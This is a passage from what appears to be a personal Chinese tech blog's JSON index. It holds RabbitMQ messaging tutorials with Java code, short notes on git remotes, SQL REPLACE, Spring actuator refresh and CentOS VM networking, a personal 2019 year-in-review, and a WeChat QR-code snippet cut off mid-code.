builder.append(count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(fanout.getName(),&quot;&quot;,message); System.out.println(&quot;[x] sent&quot; +message); } }direct@Profile({&quot;tut4&quot;,&quot;routing&quot;}) @Configuration public class Tut4Config { // 设置exchange @Bean public DirectExchange direct(){ return new DirectExchange(&quot;tut.direct&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ // 创建两个匿名Queue an anonymous, non-durable, exclusive, auto-delete queue @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } // 绑定相关数据 @Bean public Binding binding1a(DirectExchange directExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;orange&quot;); } @Bean public Binding binding1b(DirectExchange directExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(directExchange).with(&quot;black&quot;); } @Bean public Binding binding2a(DirectExchange directExchange,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(directExchange).with(&quot;green&quot;); } @Bean public Binding binding2b(DirectExchange direct,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(direct).with(&quot;black&quot;); } // @Bean public Tut4Receiver receiver(){ return new Tut4Receiver(); } } @Profile(&quot;sender&quot;) @Bean public Tut4Sender sender(){ return new Tut4Sender(); } } public class Tut4Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException{ receive(in,1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException{ receive(in,2); } public void receive(String in,int receiver) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver+&quot;[x] received &apos; &quot; + in+ &quot;&apos;&quot;); doWork(in); watch.stop(); System.out.println(&quot;instance &quot;+ receiver+&quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch: in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut4Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private DirectExchange directExchange; AtomicInteger index = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); private final String[] keys = {&quot;orange&quot;, &quot;black&quot;, &quot;green&quot;}; @Scheduled(fixedDelay = 1000, initialDelay = 500) public void send() { StringBuilder builder = new StringBuilder(&quot;Hello to &quot;); if (this.index.incrementAndGet() == 3) { this.index.set(0); } String key = keys[this.index.get()]; builder.append(key).append(&apos; &apos;); builder.append(this.count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(directExchange.getName(), key, message); System.out.println(&quot;[X] sent &apos;&quot; + message + &quot;&apos;&quot;); } }topic@Profile({&quot;tut5&quot;,&quot;topics&quot;}) @Configuration public class Tut5Config { @Bean public TopicExchange topicExchange(){ return new TopicExchange(&quot;tut.topic&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Tut5Receiver receiver(){ return new Tut5Receiver(); } @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } @Bean public Binding binding1a(TopicExchange topicExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.orange.*&quot;); } @Bean public Binding binding1b(TopicExchange topicExchange,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(topicExchange).with(&quot;*.*.rabbit&quot;); } @Bean public Binding binding2a(TopicExchange topic,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(topic).with(&quot;lazy.#&quot;); } } @Profile(&quot;sender&quot;) @Bean public Tut5Sender sender(){ return new Tut5Sender(); } } public class Tut5Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException { receive(in, 1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException { receive(in, 2); } public void receive(String in, int receiver) throws InterruptedException { StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver + &quot; [X] received &apos; &quot; + in + &quot; &apos;&quot;); doWork(in); watch.stop(); System.out.println(&quot;instance &quot; + receiver + &quot; [X] Done in&quot; + watch.getTotalTimeSeconds() +&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch : in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut5Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private TopicExchange topicExchange; AtomicInteger index = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); private final String[] keys = {&quot;quick.orange.rabbit&quot;, &quot;lazy.orange.elephant&quot;, &quot;quick.orange.fox&quot;, &quot;lazy.brown.fox&quot;, &quot;lazy.pink.rabbit&quot;, &quot;quick.brown.fox&quot;}; @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;Hello to &quot;); if(this.index.incrementAndGet() == keys.length){ this.index.set(0); } String key = keys[this.index.get()]; builder.append(key).append(&quot; &quot;); builder.append(this.count.incrementAndGet()); String message = builder.toString(); rabbitTemplate.convertAndSend(topicExchange.getName(),key,message); } }","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-topic","slug":"RabbitMQ-topic","date":"2020-03-13T06:01:21.000Z","updated":"2020-11-14T17:10:44.401Z","comments":true,"path":"2020/03/13/RabbitMQ-topic/","link":"","permalink":"http://yoursite.com/2020/03/13/RabbitMQ-topic/","excerpt":"","text":"Topic在之前的一篇教程中，我们改进了日志系统。我们使用 direct 直接广播，而不是使用 fanout ,从而获得了选择性接收日志的可能性。 虽然使用 direct exchange 改进了我们的系统，但它任然有局限性–它不能基于多个标准进行路由。 Topic exchange消息发送到 topic exchange 不能是一个随意的 routing-key 。它必须是一个由 . 分割单纯列表。 例如 stock.usd.nyse 、 nyse.vmw 、 quick.orange.rabbit 等。 routing- key 可以有尽可能多，但是最多255字节。 绑定键必须采用相同的形式。 topic exchange 和 direct exchange 类似-使用特定 routig key发送的消息会被传递到匹配 binding key 的队列里面。但是，对于 routing key 有两个特殊情况 * (star）可以替代一个单词 # (hash) 可以代替0个或多个单词 Topic exchangeTopic exchange是非常厉害的并且可以表现和其他exchange一样的 当一个队列是用 # 绑定，那么就会接受到所有信息，不管routing-key是什么，就像fanout 当绑定中不使用 * 和 # 等特殊字符，topic exchange就会像direct exchange Sender.javapublic class Send { private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { // 创建连接 Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); //声明exchange channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC); // 消息内容 String msg = &quot;hello world!&quot;; channel.basicPublish(EXCHANGE_NAME,&quot;routekey1.1&quot;,null,msg.getBytes()); channel.close(); connection.close(); } }Rece1.javapublic class Rece1 { private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // String queueName = channel.queueDeclare().getQueue(); // // 声明队列 // channel.queueDeclare(queueName,false,false,false,null); //绑定队列到交换机上 channel.queueBind(queueName,EXCHANGE_NAME,&quot;routekey.*&quot;); //同一时刻服务器只发送一条消息 channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 :&quot; + msg); try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(queueName,false,consumer); } }Rece2.javapublic class Rece2 { private final static String QUEUE_NAME = &quot;test_queue_topic_work_2&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_topic&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // 声明队列 channel.queueDeclare(QUEUE_NAME,false,false,false,null); //绑定队列到交换机上 channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;*.*&quot;); //同一时刻服务器只发送一条消息 channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 :&quot; + msg); try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-routing","slug":"RabbitMQ-routing","date":"2020-03-11T06:58:19.000Z","updated":"2020-11-14T17:10:45.278Z","comments":true,"path":"2020/03/11/RabbitMQ-routing/","link":"","permalink":"http://yoursite.com/2020/03/11/RabbitMQ-routing/","excerpt":"","text":"routing在之前的导航中，我们创建了一个简单日志系统，我们能够将日志信息广播到很多接受者。 在本篇导航中，我们将为其添加一个特性-我们将使订阅消息的一个子集成为可能。例如，我们能够将错误信息定向写入错误日志文件，同时能够在控制台打印所有信息。 binding在之前的例子中我们能够创建绑定，你可能会回想起这样的代码 channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;);绑定是交换和队列之间的关系。这可以简单地理解：队列对来自这个交换的消息感兴趣。 绑定可以使用额外的routingKey参数。为了避免与基本的发布参数混淆，我们将其称为绑定键。这就是我们如何键创建绑定的方法。 channel.queueBind(queueName, EXCHANGE_NAME, &quot;black&quot;);绑定键的意义取决于交换类型。我们之前使用的 fanout 交换机完全忽略了它的价值。 Direct exchange我们之前使用的 fanout exchange,这并没有给我们多大的灵活性——它只能进行不需要动脑筋的广播。我们将用 directexchange.消息可以传递到其绑定键 bindingKey 与消息的路由键 routingkey 完全匹配的队列 ![direct形式exchange](http://qjrzrivoh.hd-bkt.clouddn.com/1605373844.89553489789.png) 我们可以看到，这里面error可以发送到 amqp.gen-S9b... 和 amqp.gen-Ag1...队列中,而info和waring只能发送到 amqp.gen-Ag1... 队列中 Send.java public class Send { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); // 创建channle Channel channel = connection.createChannel(); // 声明exchange channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT); String msg = &quot;hello exchange direct&quot;; String routingKey = &quot;error&quot;; channel.basicPublish(EXCHANGE_NAME, routingKey, null, msg.getBytes()); channel.close(); connection.close(); } }Rece1.java public class Rece1 { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;); channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 recieve msg :&quot; + msg); try{ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }Rece2.java public class Rece1 { private static final String EXCHANGE_NAME = &quot;test_exchange_direct&quot;; private static final String QUEUE_NAME = &quot;test_queue_direct1&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.queueBind(QUEUE_NAME,EXCHANGE_NAME,&quot;error&quot;); channel.basicQos(1); Consumer consumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body,&quot;utf-8&quot;); System.out.println(&quot;rece1 recieve msg :&quot; + msg); try{ TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); }finally { System.out.println(&quot;rece1 done&quot;); channel.basicAck(envelope.getDeliveryTag(),false); } } }; channel.basicConsume(QUEUE_NAME,false,consumer); } }偶尔报错队列绑定交换机时，routingKey是具有缓存机制的。我在写代码的时候，误操作了将队列都绑定了 error ， info , warning .我发现无法实现上述的效果，改了代码，但是还是无法解决。最后登录了RabbitMQ查看相关绑定。并使用的unbind功能。 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-B8DH8bJF-1583909785873)(https://s2.ax1x.com/2020/03/11/8AFtBT.md.png)]","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-发布订阅","slug":"RabbitMQ-发布订阅","date":"2020-03-09T10:35:29.000Z","updated":"2020-11-14T17:10:46.418Z","comments":true,"path":"2020/03/09/RabbitMQ-发布订阅/","link":"","permalink":"http://yoursite.com/2020/03/09/RabbitMQ-%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85/","excerpt":"","text":"发布与订阅在上一个教程中，我们创建一个工作队列，我们将每个人物，最终恰好分配到一个工人。然而，在这个部分，我们希望每个消息能分配给多个消费者。这种叫发布订阅模式。举例，注册时需要同时发送短信和发送email,我们会将用户注册的信息发给两个消费者，一个专门发送短信消费者，一个专门发送email消费者。 RabbitMQ消息传递模型的核心思想是，生产者不直接想消息队列发送信息。实际上，生产者并不知道消息是否会被传递到任何队列上。 交换机这里就讲到一个新型概念，交换机（exchange）,一方面接收生产者的信息，一方面推送给队列。交换器必须确切地知道如何处理它接收到的消息。它应该被附加到一个特定的队列吗?它应该被添加到许多队列中吗?或者它应该被丢弃。这些规则由exchange类型定义。有几种可用的交换类型:direct、topic、headers和fanout。下面讲：fanout，是一个比较简单的类型。只是将消息广播到它知道的所有队列中去。下图中X就是交换机。 生产者public class Send { private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection() ; Channel channel = connection.createChannel(); // 声明队列 channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.FANOUT);//分发类型fanout String msg = &quot;hello world ps&quot;; // 发送信息 channel.basicPublish(EXCHANGE_NAME,&quot;&quot;,null,msg.getBytes()); System.out.println(&quot;send success&quot;); // 关闭流 channel.close(); connection.close(); } }消费者public class Rece1 { private final static String QUEUE_NAME = &quot;test_queu_email&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // 绑定队列 channel.queueDeclare(QUEUE_NAME, false, false, false, null); // 绑定队列到交换机上 channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;); //qos=1 channel.basicQos(1); DefaultConsumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { System.out.println(&quot;send email &quot; + new String(body, Charset.defaultCharset())); channel.basicAck(envelope.getDeliveryTag(), false); } }; boolean autoAck = false; channel.basicConsume(QUEUE_NAME, autoAck, consumer); } } public class Rece2 { private final static String QUEUE_NAME = &quot;test_queu_msg&quot;; private final static String EXCHANGE_NAME = &quot;test_exchange_fanout&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); // 绑定队列 channel.queueDeclare(QUEUE_NAME, false, false, false, null); // 绑定队列到交换机上 channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;&quot;); //qos=1 channel.basicQos(1); DefaultConsumer consumer = new DefaultConsumer(channel) { @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { System.out.println(&quot;send msg &quot; + new String(body, Charset.defaultCharset())); channel.basicAck(envelope.getDeliveryTag(), false); } }; boolean autoAck = false; channel.basicConsume(QUEUE_NAME, autoAck, consumer); } }官方推荐的queue_name官方希望能够实现，生成唯一名称queue_name,并且一旦断开生产者连接，队列自动删除。 String queueName = channel.queueDeclare().getQueue();","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-工作队列","slug":"RabbitMQ-工作队列","date":"2020-02-29T14:15:17.000Z","updated":"2020-11-14T17:10:46.923Z","comments":true,"path":"2020/02/29/RabbitMQ-工作队列/","link":"","permalink":"http://yoursite.com/2020/02/29/RabbitMQ-%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/","excerpt":"","text":"介绍RabbitMQ是消息代理。它接收信息和转发信息。你可以把他考虑成一个邮局。当你讲邮寄的信放在邮局时，你可以确定邮差先生或者女士会把邮件最终送到你的收件人手中。当然邮局和RabbitMQ最大的区别，RabbitMq不接受纸张，它只接收，存储，转发二进制的数据消息快。 下面讲一些RabbitMQ中的术语： Producer 生成只不过意味着发送信息。发送信息的程序是生产者 Queue 队列是驻留在RabbitMQ内的邮箱的名称。尽管消息flowRabbitMQ和你的程序，但是他们只能存储在队列中。一个队列只受主机的内存和磁盘限制，它的本质是一个大的消息缓冲区。许多消费者可以将消息发送到一个队列，许多消费者可以尝试从一个队列接收数据，这就我们表示队列的方式。 Consumer 消费和接收有相同的意义。消费者是一个主要接收消息的程序 注意：生产者、消费者和代理不必都在同一主机上；实际上，在大多数应用程序中，它们并没有这样做。应用程序既可以是生成者也可以是消费者。 简单队列简单队列，就是发送单个消息的消费者和接收信息并将其打印出来的使用者（消费者），不多叙述。 工作队列工作队列主要是避免短时间内执行密集任务，并且必须等待它完成。我们将任务放在消息队列中，启动多个消费者，任务在他们中是共享的。 设计到工作队列，当然会有不同方式的工作队列 ack关于 ack 这边多讲一点， message acknowledgment 是消息确认，设置 autoack=true之后，consumer返回一个ack（nowledgement）,告诉 rabbitMQ 已经接受信息，处理了特定的消息， RabbitMQ可以自由地删除它。 轮询队列（Round-robin dispatching）将 autoAck 设置为 true,默认情况下，RabbitMQ会发送每条信息给另一个消费者。每个消费者都会获取相同数量的。并且是间隔形式的。如有c1,c2消费者，10条消息，c1是0,2,4,6,8，c2是1,3,5,7,9。当然，在我打断点时，发现对应的数据会都一次性发送到c1，和c2，c1和c2处理信息时，并不影响彼此。 公平队列在 RabbitMQ 分发信息的时候，可能会发现，一个consumer很忙，另一个一点也不忙。因为 RabbitMQ对此一无所知，只是将第N条信息，发送给第Nconsumer. 为了解决这个，我们将basicQos方法和prefetechCount=1设置一起用。换句话说，在处理并确认上一条信息之前，不要将新信息发送给工人。 int prefetchCount = 1; channel.basicQos(prefetchCount);并且，我们需要将autoAck设为false和处理完一条消息后发送ack给 RabbitMQ DefaultConsumer defaultConsumer = new DefaultConsumer(channel){ @Override public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException { String msg = new String(body, &quot;utf-8&quot;); System.out.println(&quot;receive1 : &quot; + msg); try { Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); }finally { channel.basicAck(envelope.getDeliveryTag(),false); } } }; boolean autoack = false; channel.basicConsume(QUEUE_NAME,autoack,defaultConsumer);","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"erlang","slug":"erlang","permalink":"http://yoursite.com/tags/erlang/"}]},{"title":"git修改远程仓库","slug":"git修改远程仓库","date":"2020-02-10T08:08:23.000Z","updated":"2020-11-14T17:10:47.390Z","comments":true,"path":"2020/02/10/git修改远程仓库/","link":"","permalink":"http://yoursite.com/2020/02/10/git%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/","excerpt":"","text":"起因公司用的托管仓库是coding，然后今天仓库地址换了，更新项目时，提示报错，遂更新远程仓库 Coding 提示: Public key expired. 此公钥已经超过有效期，要继续使用请到 https://coding.net/user/account/setting/keys 更改设置。 fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists.解决方案先更新了一下项目中ssh key的有效期，我就设置成了永久有效 然后修改远程仓库地址 # 删除当前远程仓库地址 git remote rm origin # 添加远程仓库 git remote add origin [url] # 让本地能够读取远程的分支，以便后续track git fetch # 本地追踪远程 git branch --set-upstream-to=origin/master master根据以上操作，应该就会好了","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"sql replace","slug":"sql replace","date":"2020-01-18T07:51:42.000Z","updated":"2020-11-14T17:10:47.868Z","comments":true,"path":"2020/01/18/sql replace/","link":"","permalink":"http://yoursite.com/2020/01/18/sql%20replace/","excerpt":"","text":"sql替换起因七牛云上传图片的返回时，前端拼接了域名，导致图片保存时，是全域名，例如 http://example.com/a.jpg 出现一个问题，域名快要到期了，需要更换域名，数据库中保存的数据需要更换成新的域名 找到的答案UPDATE your_table SET your_field = REPLACE(your_field, &apos;articles/updates/&apos;, &apos;articles/news/&apos;) WHERE your_field LIKE &apos;%articles/updates/%&apos; 答案地址 实际应用UPDATE banner SET img_url = REPLACE(img_url, &apos;http://example.com&apos;, &apos;http://google.com&apos;) WHERE img_url like &apos;http://example.com%&apos;;","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"springcloud中结合actuator不支持_actuator_refresh","slug":"springcloud中结合actuator不支持_actuator_refresh","date":"2020-01-17T02:55:46.000Z","updated":"2020-11-14T17:10:48.597Z","comments":true,"path":"2020/01/17/springcloud中结合actuator不支持_actuator_refresh/","link":"","permalink":"http://yoursite.com/2020/01/17/springcloud%E4%B8%AD%E7%BB%93%E5%90%88actuator%E4%B8%8D%E6%94%AF%E6%8C%81_actuator_refresh/","excerpt":"","text":"起因因为springcloud config 里面需要获取刷新配置时，在访问浏览器 http://localhost:13000/actuator/refresh 时，发现出错。 排查Whitelabel Error Page This application has no configured error view, so you are seeing this as a fallback. Fri Jan 17 10:40:30 CST 2020 [2d29c4d7] There was an unexpected error (type=Method Not Allowed, status=405). Request method &apos;GET&apos; not supported浏览器报错，出现 Request method &#39;GET&#39; not supported ,不支持 GET请求，可惜，我第一次出错的时候，没有仔细看报错信息。 走弯路首先，我放开了 actuator 的所有路径 management: endpoints: web: exposure: include: &quot;*&quot;再访问 localhost:13000/actuator 可以看到，里面有refresh &quot;refresh&quot;: { &quot;href&quot;: &quot;http://localhost:13000/actuator/refresh&quot;, &quot;templated&quot;: false }后来又在github上找到了相似的问题 https://github.com/spring-projects/spring-boot/issues/10829 里面提到了 /actuator/refresh 不支持 GET ,支持 POST","categories":[],"tags":[{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"2019年年度总结","slug":"2019年年度总结","date":"2019-12-18T10:06:19.000Z","updated":"2020-11-14T17:10:49.478Z","comments":true,"path":"2019/12/18/2019年年度总结/","link":"","permalink":"http://yoursite.com/2019/12/18/2019%E5%B9%B4%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"今年大致做了什么2018.12-2019.02这段时间在上海一家20个人的游戏公司，早上吃罗森的包子，喝豆浆，参与了红包项目。公司架构是后端springboot+Netty,前端Unity3D.工作到2月底。印象比较深的是，公司有只兔子，每天就是吃吃，而且离我们近，好臭，有几次，周末没人在，兔子竟然就没吃，星期一去的时候，兔子和疯子一样，最后也不知道，兔子有没有成红烧兔子。学校让回去毕业设计，于是离职。 2019.03-2019.06这段时间在学校过了一段最逍遥自在的日子，每天睡到自然醒（当然现在工作也是睡到自然醒），这段时间学习了Vue,并完成了毕业设计,《基于Springboot+Vue实现的H5网上商城》，时间还是蛮紧凑的，快到答辩的时候才完成。当然写毕业设计不是最主要的，而是写论文才是最主要，你得写到重复率不高。后面答辩是一次通过的。 2019.06-2019-12这段时间，离开学校后，就来到了苏州，只能说空气环境好（我是指工业园区这边），这边菜也挺好的。现在在做一个日本服装品牌的外包，小程序和APP都在做。在这边主要使用Java,偶尔也需要使用Php来写东西。参与了很多小项目，也经历不少事。只能说，以前天真的我，缺乏社会毒打。 今年git活跃度 第一张是6月之后新公司的记录，第二张是github上的上面的，还有之前公司的记录没法找了 今年学习的新技能 看完了 线程相关的书（汪文君、那个阿里系的人写到），看完就忘了。 看了一点Netty的书和记录，大致了解Netty,也学习了网络通信相关 使用redis开发，也只是冰山一角 关于linux相关，阅读了相关数据，不算熟练 今年游戏记录 王者已经能多次单排到王者，巅峰赛最高1458。最后发现游戏改了面目全非，不想玩了 玩了英雄联盟，还是不适应 玩了看门狗，爽，就是容易迷失任务 玩了csgo，爽啊，真适合我这样的人玩，玩玩休闲模式 今年看片指导单身狗只能靠看片来维持生活了，今年日本推出了不少好看的片 ipx系列，我只能说，拍摄手法很好看，ipx177相关的，很好看 有很多，也不好一一点评，但是确实好看的很多今年。 今年的感情生活还是空空如也，0分。只有生病的时候，和一个人无聊的时候才会想找个女朋友。期待明年能遇见个妹子。 梯队 1.三观2.长相3.等等 年度感想 人的生命很短，活在当下。每个月的工资发下来，该用就用，给父母买点东西，寄点钱。 今年的大环境感觉就是中美对抗，然后IT行业好多公司裁员。真的是凛冬将至 明年展望 交个女朋友 多多锻炼 去另一个城市，说不定我会回上海，或者去杭州 挣钱让父母他们去旅游 努力学习","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"vmware安装centos7并开启ssh","slug":"vmware安装centos7并开启ssh","date":"2019-12-09T15:50:07.000Z","updated":"2020-11-14T17:10:49.942Z","comments":true,"path":"2019/12/09/vmware安装centos7并开启ssh/","link":"","permalink":"http://yoursite.com/2019/12/09/vmware%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E5%BC%80%E5%90%AFssh/","excerpt":"","text":"原由记录安装centos7，由于要用到docker和elasticsearch 下载路径vmware : https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html centos7镜像: https://www.jianshu.com/p/a63f47e096e8 centos7安装教程: https://blog.csdn.net/vevenlcf/article/details/78297008vmvare 密钥 密钥 centos安装centos7推荐使用english，然后使用命令行形式安装 centos 网络由于刚装好的centos无法联网，所以需要配置网络 推荐博文 ，通过阅读文档，找到 gateway,然后操作文件 vi /etc/sysconfig/network-scripts/ifcfg-ens33i BOOTPROTO=static#启用静态IP地址 ONBOOT=yes #开启自动启用网络连接 IPADDR=192.168.1.73 # 需要和gateway不同，你可以随便写，最后一个数字不一样 GATEWAY=192.168.1.1 # 网管需要适应本机 NETMASK=255.255.255.0 DNS1=114.114.114.114 DNS2=8.8.8.8:wq 测试 service network restart 重启网络 ping www.baidu.com 测试 开启ssh 具体文档 本人比较喜欢适应xshell来接触网络","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"微信获取小程序码","slug":"微信获取小程序码","date":"2019-11-26T03:44:48.000Z","updated":"2020-11-14T17:10:50.912Z","comments":true,"path":"2019/11/26/微信获取小程序码/","link":"","permalink":"http://yoursite.com/2019/11/26/%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%81/","excerpt":"","text":"微信小程序获取小程序码的无限制接口是返回二进制内容 请求微信接口获取字节数组byte[] public byte[] getQrCodeUnlimited(String scene,String page){ // 获取access_token 请自己封装 String accessToken = getAccessToken(); Map&lt;String,String&gt; params = new HashMap&lt;&gt;(3); params.put(&quot;scene&quot;,scene); params.put(&quot;page&quot;,page); try { byte[] buffer = HttpClientUtil.doJsonPostRawResponse(&quot;https://api.weixin.qq.com/wxa/getwxacodeunlimit?access_token=&quot; + accessToken, null, params); return buffer; }catch (Exception e){ e.printStackTrace(); return null; } } // 此处的httpUtil是我自己封装的，你也可以使用[wxJava](https://github.com/Wechat-Group/WxJava)里面的小程序获取byte数组的方法获取，第二种没有尝试过通过springmvc输出出去@RequestMapping(&quot;/qrcode&quot;) @RestController public class QrCodeController { @Autowired private WechatUtil wechatUtil; // 这个方法可以实现，十分简单 @RequestMapping(&quot;/unlimted&quot;) public void getQrcodeUnlimted(@RequestParam(value = &quot;page&quot;,required = false)String page,@RequestParam(value = &quot;sid&quot;,required = false)String sid, HttpServletResponse response) throws IOException { sid = 